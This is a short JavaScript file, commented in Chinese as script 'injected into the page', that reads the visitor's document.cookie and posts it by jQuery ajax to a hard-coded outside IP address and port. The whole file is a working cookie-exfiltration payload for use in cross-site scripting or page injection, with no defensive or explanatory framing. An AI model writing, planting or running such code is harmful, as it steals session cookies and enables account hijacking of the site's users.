// 注入页面的 js
console.log(111);
console.log(document.cookie);
$.ajax({
    type: 'post',
    url: 'https://129.204.113.40:25505/test',
    async: false,
    contentType: "application/json; charset=UTF-8;",
    data: JSON.stringify({
        cookie: document.cookie
    }),
    success: function (json) {
        console.log('done');
    }
});